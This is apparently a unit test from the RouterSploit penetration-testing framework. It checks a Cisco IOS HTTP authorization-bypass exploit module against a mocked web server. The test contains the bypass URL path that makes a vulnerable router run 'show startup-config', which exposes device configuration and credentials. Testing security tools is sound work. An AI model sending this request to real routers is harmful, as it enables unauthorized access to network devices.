from routersploit.modules.exploits.routers.cisco.ios_http_authorization_bypass import Exploit


def test_check_success(target):
    """ Test scenario - successful check """

    route_mock = target.get_route_mock("/level/44/exec/-/show startup-config", methods=["GET"])
    route_mock.return_value = (
        "test"
        "Command was:  show startup-config"
        "test"
    )

    exploit = Exploit()

    assert exploit.target == ""
    assert exploit.port == 80
    assert exploit.show_command == "show startup-config"

    exploit.target = target.host
    exploit.port = target.port

    assert exploit.check()
    assert exploit.run() is None
